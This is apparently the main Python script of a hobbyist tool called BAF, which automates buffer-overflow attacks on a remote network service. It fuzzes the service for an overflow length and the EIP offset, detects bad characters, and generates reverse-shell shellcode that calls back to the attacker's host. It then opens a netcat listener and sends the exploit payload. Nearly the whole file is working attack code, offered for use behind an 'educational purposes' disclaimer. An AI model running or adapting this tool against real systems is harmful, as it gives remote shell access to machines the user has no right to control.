# fucking aggressive buffer overflow scanner! Only use it for educational proposes!!!

from connector import *
from exploit import *
from fuzz import *
from logger import *
from setup_exploit import *
from netcat import *
import argparse
import random
import os
import sys


shell_code = ""
payload = ""


def start_fuzzing(s: socket, prefix, r_ip_port, timeout=1, buffer_count=0, verbose=False):
    logging_console(f"Fuzzing prefix {prefix}...", "VERBOSE")
    length_of_overflow = fuzz(
        prefix=prefix, ip=r_ip_port[0], port=r_ip_port[1], timeout=timeout, buffer_count=buffer_count)

    if length_of_overflow == -1:
        return (length_of_overflow, 0)

    logging_console(
        f"FOUND BOF VULNERABILITY: {length_of_overflow} buffers needed", "CRITICAL")
    logging_console("Generating pattern", "INFO")
    pattern = create_pattern(length_of_overflow+400)
    logging_console(f"Sending pattern: {pattern}", "INFO")

    eip = ""
    offset = ""
    tries = 0
    while (len(eip) == 0 or offset == -1 or len(str(offset)) == 0) and tries < 3:
        reset_bin()
        send(prefix+" "+pattern, r_ip_port[0], r_ip_port[1], timeout)
        eip = logging_console(
            f"Sent pattern, paste in EIP's value: ", "QUESTION")
        offset = offset_pattern(length_of_overflow+400, eip)
        logging_console(f"Offset: {offset}", "POSITIVE")

    if eip == "q":
        logging_console("Exiting program...", "WARNING")
        exit()

    if tries == 3:
        logging_console(
            f"Tried 3 times to get offset, all unsuccessful", "NEGATIVE")
        logging_console("Exiting program...", "WARNING")
        exit(0)
    return (length_of_overflow, offset)


def start_bad_char_detection(prefix, length_of_overflow, r_ip_port, timeout=1):
    logging_console("Generating all chars from 0x00 to 0xFF", "INFO")
    all_characters = all_chars()
    logging_console(
        f"All chars (including 0x00): `{all_characters.decode('latin1')}`", "INFO")
    bad_chars = ""
    bad_chars_save = []
    loops = 0
    while bad_chars != "!":
        if loops == 0:
            all_characters = str(all_characters)[2:-1].split('\\\\x')[1:]
        else:
            all_characters = all_characters.split('\\x')[1:]

        reset_bin()

        # TODO: create a much more efficient way than this shit down below!
        print("all_characters: ", all_characters)

        if loops == 0:
            payload = prefix+" "+"A" * \
                (length_of_overflow-len(all_characters)) + \
                "\\x"+"\\x".join(all_characters)
        else:
            payload = prefix+" "+"A" * \
                (length_of_overflow-len(all_characters)) + \
                "\\x".join(all_characters)
        print(f"len_of_overflow: {length_of_overflow}")
        print("Sending: ", payload)
        connected = False
        for i in range(1, 10):
            try:
                s = connect((r_ip_port[0], r_ip_port[1]), timeout=timeout)
                connected = True
                break
            except socket.timeout:
                logging_console(
                    f"Connection timeout ({i})... Resend", "WARNING")
        if not connected:
            logging_console(f"Pinging host...", "WARNING")
            if not host_up(r_ip_port[0]):
                logging_console(f"Host is not up!", "NEGATIVE")
                logging_console("Exiting program...", "WARNING")
                exit()
        try:
            s.recv(1024)
        except:
            pass
        exec(f"""s.send(bytes('{payload}', encoding="latin1"))""")
        exec(f"print(len('{payload}'))")
        # exec(f"print('{payload}')")
        # s.send(bytes(payload, encoding="latin1"))
        try:
            s.recv(1024)
        except:
            pass

        if loops == 0:
            bad_chars = logging_console(
                f"Type in bad chars (in format `\\x00\\x01\\x02\\x03` and ! to continue): ", "QUESTION", end="\n\r")
        else:
            bad_chars = logging_console(
                f"Type in bad chars (in format `\\x00\\x01\\x02\\x03` and ! to continue) {bad_chars_save}: ", "QUESTION", end="\n\r")

        # all_characters = all_characters.split('\\x')[1:]

        if bad_chars == "!":
            break

        tries = 0
        bad_chars_save.append(bad_chars)
        print("Bad_char: ", bad_chars_save[bad_chars_save.index(bad_chars)])
        while not check_format(bad_chars=bad_chars_save[bad_chars_save.index(bad_chars)]) and tries < 3:
            tries += 1
            bad_chars_save.remove(bad_chars)
            bad_chars = logging_console(
                "Invalid bad chars format. (should be in format `\\x00\\x01\\x02\\x03`): ", "QUESTION")
            bad_chars_save.append(bad_chars)

        if tries == 3:
            logging_console(
                "Bad characters have bad format", "NEGATIVE")
            logging_console("Exiting program...", "WARNING")
            exit(0)

        if bad_chars.split("\\x")[1] in all_characters:
            all_characters.remove(bad_chars.split("\\x")[1])
        else:
            logging_console(
                f"{bad_chars} not found in all generated characters, continue", "NEGATIVE")

        all_characters = "\\x"+"\\x".join(all_characters)
        loops += 1
        # send(payload,
        #      r_ip_port[0], r_ip_port[1], timeout)
    return bad_chars


def exploit_buffer_setup(shell_code, addr, prefix, offset):
    global payload
    payload = exploit_buffer(shell_code, addr, prefix, offset)


def start_exploitation(shell_code, addr, prefix, offset, random_port, r_ip_port, timeout):
    payload_thread = threading.Thread(
        target=exploit_buffer_setup, args=([shell_code, addr, prefix, offset]))
    payload_thread.start()
    counter = 0
    while payload_thread.is_alive():
        counter += 1
        if counter % 5 == 0:
            logging_console("Generating payload.....|", "POSITIVE", end="\r")
        if counter % 4 == 0:
            logging_console("Generating payload.....\\", "POSITIVE", end="\r")
        if counter % 2 == 0:
            logging_console("Generating payload...../", "POSITIVE", end="\r")
        if counter % 3 == 0 or counter % 7 == 0:
            logging_console("Generating payload.....-", "POSITIVE", end="\r")
        time.sleep(0.2)
    if os.path.isfile('payload.txt'):
        with open('payload.txt', 'w+') as file:
            file.write(payload)
    else:
        with open('payload.txt', 'a+') as file:
            file.write(payload)
    logging_console("Generated payload, saved in `payload.txt`", "POSITIVE")
    logging_console("Starting netcat", "VERBOSE")
    netcat(random_port)
    logging_console("Sending payload", "VERBOSE")
    send(payload, r_ip_port[0], r_ip_port[1], timeout)
    logging_console("Payload sent", "INFO")
    # check netcat!


def generate_shellcode_main(ip_port: tuple, bad_chars: str):
    global shell_code
    shell_code = generate_shellcode(ip_port, bad_chars)


def main(l_ip_port: tuple, r_ip_port: tuple, convention: str = "little", prefix="", prefixes="", buffer_count=0, len_of_overflow=0, offset_user=0, timeout=1, verbose: bool = False, escape_fuzz: bool = False, escape_chars="", escape_bad_char_detection=False, nobanner=False):
    banner = """
\x1b[91m ____ \x1b[32m    _   \x1b[91m  _____ 
| __ )\x1b[32m   / \  \x1b[91m |  ___|
|  _ \ \x1b[32m / _ \ \x1b[91m | |_   
| |_) \x1b[32m / ___ \ \x1b[91m|  _|  
|____ \x1b[32m/_/   \_ \x1b[91m\_|    
                    
\x1b[91m _____           _    _            \x1b[32m                                  _          \x1b[91m    ____   ___  _____ \x1b[39m                                      
\x1b[91m|  ___|   _  ___| | _(_)_ __   __ _ \x1b[32m    __ _  __ _ _ __ ___  ___ ___(_)_   _____\x1b[91m   | __ ) / _ \|  ___|\x1b[39m   ___  ___ __ _ _ __  _ __   ___ _ __ \x1b[35mBeta\x1b[32m
\x1b[91m| |_ | | | |/ __| |/ / | '_ \ / _` | \x1b[32m  / _` |/ _` | '__/ _ \/ __/ __| \ \ / / _ \ \x1b[91m |  _ \| | | | |_   \x1b[39m  / __|/ __/ _` | '_ \| '_ \ / _ \ '__|
\x1b[91m|  _|| |_| | (__|   <| | | | | (_| | \x1b[32m | (_| | (_| | | |  __/\__ \__ \ |\ V /  __/\x1b[91m  | |_) | |_| |  _|  \x1b[39m  \__ \ (_| (_| | | | | | | |  __/ |   
\x1b[91m|_|   \__,_|\___|_|\_\_|_| |_|\__, |  \x1b[32m \__,_|\__, |_|  \___||___/___/_| \_/ \___|\x1b[91m  |____/ \___/|_|    \x1b[39m  |___/\___\__,_|_| |_|_| |_|\___|_|   
\x1b[91m                              |___/   \x1b[32m       |___/   Made with \x1b[36m<3                                                                                      """
    print(banner)
    if verbose:
        init(True)

    logging_console("Starting Program", "INFO")
    logging_console("Trying to connect...", "VERBOSE", end="\r")
    try:
        s = connect(r_ip_port)
        logging_console("Connected!"+" "*10, "POSITIVE")
    except:
        logging_console(
            "Connection timeout, could not connect. Executing ping test...", "WARNING")
        if not host_up(r_ip_port[0]):
            logging_console("Host is not up. Maybe mistyped?", "NEGATIVE")
            logging_console("Exiting program", "NEGATIVE")
            exit(0)
        else:
            logging_console("Host is up! Trying to reconnect...", "POSITIVE")
            s = connect(r_ip_port)

    # fuzzing
    if not escape_fuzz:
        if prefix and not prefixes:
            length_of_overflow, offset = start_fuzzing(
                s, prefix, r_ip_port, timeout, buffer_count, verbose)
        else:
            length_of_overflow = 0
            offset = 0
            for prefix in range(prefixes):
                len_of_overflow_small, offset_small = start_fuzzing(
                    s, prefix, r_ip_port, timeout, buffer_count, verbose)

    else:
        logging_console("Escaped fuzz, will use given values", "POSITIVE")
        logging_console(
            "Note: BAF won't work as expected if the values are wrong!", "INFO")
        length_of_overflow, offset = len_of_overflow, offset_user

    # Scaning bad chars
    if not escape_bad_char_detection:
        bad_chars = start_bad_char_detection(
            prefix, length_of_overflow, r_ip_port, timeout)

    else:
        logging_console(
            "Escaped bad character detection, will use given values", "POSITIVE")
        logging_console(
            "Note: BAF won't work as expected if the values are wrong!", "INFO")
        bad_chars = escape_chars.split('\\')
        for bad_char in bad_chars:
            bad_chars[bad_chars.index(bad_char)] = "\\"+bad_char
    reset_bin()

    addr = ""
    while len(addr) == 0:
        addr = logging_console(
            "Type in address where i.e. `PUSH ESP` is found: (format: \\xADDRESS)", "QUESTION")

    if convention == "little":
        addr = little_endian(addr)
    random_port = random.randint(1100, 65000)
    bad_chars = ''.join(bad_chars)
    shell_code_thread = threading.Thread(
        target=generate_shellcode_main, args=([(l_ip_port[0], random_port), bad_chars]))
    shell_code_thread.start()

    counter = 0
    logging_console("Generating shell code...", "POSITIVE", end="\r")
    while shell_code_thread.is_alive():
        counter += 1
        if counter % 5 == 0:
            logging_console("Generating shell code..|", "POSITIVE", end="\r")
        if counter % 4 == 0:
            logging_console("Generating shell code..\\", "POSITIVE", end="\r")
        if counter % 2 == 0:
            logging_console("Generating shell code../", "POSITIVE", end="\r")
        if counter % 3 == 0 or counter % 7 == 0:
            logging_console("Generating shell code..-", "POSITIVE", end="\r")
        time.sleep(0.2)

    logging_console(f"Generated shell code: {shell_code}", "INFO")

    # exploitation
    bad_chars = ''.join(bad_chars)
    print("bad_chars: ", bad_chars)
    print("shell_code before exec(): ", shell_code)
    exec(shell_code)
    exec(f"shell_code = buf")
    print("shell_code after exec(): ", shell_code)
    print("addr: ", addr)
    print("prefix: ", prefix)
    print("offset: ", offset)
    print("offset_user: ", offset_user)
    xbuf = ""
    exec("xbuf = buf")
    # exec(
    #     f"start_exploitation(buf.decode('latin1'), {addr}, {prefix}, {offset}, {random_port}, {r_ip_port}, {timeout})")
    print("xbuf: ", xbuf)
    start_exploitation(xbuf, addr, prefix, offset,
                       random_port, r_ip_port, timeout)


if __name__ == '__main__':
    examples = f"""python3 {sys.argv[0]} --lhost 10.10.10.10 --lport 1337 --rhost 10.10.10.11 --rport 21 -be
python3 {sys.argv[0]} --lhost 10.10.10.10 --lport 1337 --rhost 10.10.10.11 --rport 2337 --prefix="OVERFLOW_COMMAND" --timeout=5 --littleEndian
python3 {sys.argv[0]} --lhost 10.10.10.10 --lport 1337 --rhost 10.10.10.11 --rport 22 --prefix="USER: " --timeout=2 --bigEndian -v --nobanner"""
    parser = argparse.ArgumentParser(
        description="Fuzzing & Exploitation tool for BOF_winx64", epilog=examples, formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument("--lhost", metavar="", type=str,
                        help="Local IP", required=True)
    parser.add_argument("--lport", metavar="", type=int,
                        help="Local Port", required=True)
    parser.add_argument("--rhost", metavar="", type=str,
                        help="Remote IP", required=True)
    parser.add_argument("--rport", metavar="", type=int,
                        help="Remote Port", required=True)
    parser.add_argument("-p", "--prefix", metavar="",
                        type=str, help="Prefix to check (Standart value is '')")
    parser.add_argument("-ps", "--prefixes", metavar="",
                        type=str, help="Multiple prefixes in format `prefix1,prefix2,prefix3...`")
    parser.add_argument("-t", "--timeout", metavar="", type=int,
                        help="Timeout for every request, standart value is 1")
    parser.add_argument("-ef", "--escapeFuzz", metavar="", type=str,
                        help="Escape fuzzing when values (length of buffer to trigger the overflow and the offset) are known! Format: length,offset")
    parser.add_argument("-eb", "--escapeBadCharDetection", metavar="", type=str,
                        help="Escape bad character detection when bad characters are given in format `\\x01\\x02\\x03...`")
    group1 = parser.add_mutually_exclusive_group(required=False)
    group1.add_argument("-v", "--verbose",
                        action="store_true", help="Verbose mode")
    group1.add_argument("-nb", "--nobanner",
                        action="store_true", help="No banner at start")
    group2 = parser.add_mutually_exclusive_group(required=False)
    group2.add_argument("-le", "--littleEndian",
                        action="store_true",
                        help="For Little-Endian order")
    group2.add_argument("-be", "--bigEndian",
                        action="store_true", help="For Big-Endian order")
    args = parser.parse_args()

    if not (args.littleEndian or args.bigEndian):
        logging_console(
            "There should be one convention (--littleEndian or --bigEndian), type in -h or --help for help")
        logging_console("Exiting program...", "WARNING")

    escapeFuzz, escapeBadChar = False, False

    if not args.prefix and args.prefixes:
        prefix = ""
        prefixes = args.prefixes.split(",")

    if args.prefix and not args.prefixes:
        prefixes = ""
        prefix = args.prefix

    if args.escapeFuzz:
        if "," not in args.escapeFuzz:
            logging_console(
                "Invalid value for `escapeFuzz`. Check out the help menu (-h, --help)", "WARNING")
            logging_console("Exiting program...", "WARNING")
            exit()
        if not len(args.escapeFuzz.split(',')) == 2:
            logging_console(
                "Invalid value for `escapeFuzz`. Check out the help menu (-h, --help)", "WARNING")
            logging_console("Exiting program...", "WARNING")
            exit()
        len_of_overflow, offset_user = [
            int(i) for i in args.escapeFuzz.split(',')]
        escapeFuzz = True

    else:
        len_of_overflow, offset_user = 0, 0

    if args.escapeBadCharDetection:
        escapeBadChar = True
        escape_chars = args.escapeBadCharDetection

    else:
        escape_chars = ""

    nobanner = False

    if args.nobanner:
        nobanner = True

    if args.littleEndian and not args.bigEndian:
        if args.timeout:
            main((args.lhost, args.lport), (args.rhost, args.rport),
                 args.littleEndian, prefix=prefix, prefixes=prefixes, timeout=args.timeout, verbose=args.verbose, len_of_overflow=len_of_overflow, offset_user=offset_user, escape_fuzz=escapeFuzz, escape_chars=escape_chars, escape_bad_char_detection=escapeBadChar, nobanner=nobanner)
        else:
            main((args.lhost, args.lport), (args.rhost, args.rport),
                 args.littleEndian, prefix=prefix, prefixes=prefixes, verbose=args.verbose, len_of_overflow=len_of_overflow, offset_user=offset_user, escape_fuzz=escapeFuzz, escape_chars=escape_chars, escape_bad_char_detection=escapeBadChar, nobanner=nobanner)
    else:
        if args.timeout:
            main((args.lhost, args.lport), (args.rhost, args.rport),
                 args.bigEndian, prefix=prefix, prefixes=prefixes, timeout=args.timeout, verbose=args.verbose, len_of_overflow=len_of_overflow, offset_user=offset_user, escape_fuzz=escapeFuzz, escape_chars=escape_chars, escape_bad_char_detection=escapeBadChar, nobanner=nobanner)
        else:
            main((args.lhost, args.lport), (args.rhost, args.rport),
                 args.bigEndian, prefix=prefix, prefixes=prefixes, verbose=args.verbose, len_of_overflow=len_of_overflow, offset_user=offset_user, escape_fuzz=escapeFuzz, escape_chars=escape_chars, escape_bad_char_detection=escapeBadChar, nobanner=nobanner)
